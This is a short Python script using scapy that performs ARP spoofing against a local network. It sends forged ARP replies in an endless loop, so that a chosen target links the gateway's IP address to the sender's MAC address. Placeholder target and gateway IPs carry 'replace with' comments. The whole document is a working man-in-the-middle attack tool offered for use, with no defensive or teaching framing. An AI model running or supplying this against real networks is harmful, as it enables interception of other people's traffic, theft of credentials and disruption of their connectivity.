import scapy.all as scapy

def arp_spoof(target_ip, gateway_ip):
    target_mac = scapy.getmacbyip(target_ip)
    gateway_mac = scapy.getmacbyip(gateway_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

target_ip = "192.168.1.2"  # Replace with the target IP address
gateway_ip = "192.168.1.1"  # Replace with the gateway IP address

while True:
    arp_spoof(target_ip, gateway_ip)
